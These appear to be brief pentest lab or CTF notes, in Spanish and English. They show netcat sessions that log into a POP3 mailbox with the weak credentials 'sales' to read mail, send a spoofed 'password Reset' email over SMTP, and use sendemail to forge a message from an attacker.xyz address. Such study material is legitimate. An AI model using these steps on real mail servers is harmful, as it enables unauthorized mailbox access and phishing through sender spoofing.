conexion al puerto 110
nc -v postfish.off  110

USER sales
PASS sales

*lista correos
LIST

*mostrar contenido correo
RETR 1

------
conexion al puerto 25
nc -v postfish.off  25
hello hacker
250 postfish.off (respuesta 250 es como correcto)

MAIL FROM: it@postfish.off
RCPT TO: sales@postfish.off  -> usuarios igual sirve
DATA (de aca abajo empieza el correo)
Subject: password Reset
..cuerpo correo..
. (finaliza con .)

Send a fake mail to root user using sendemail command.:
```
sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no
```

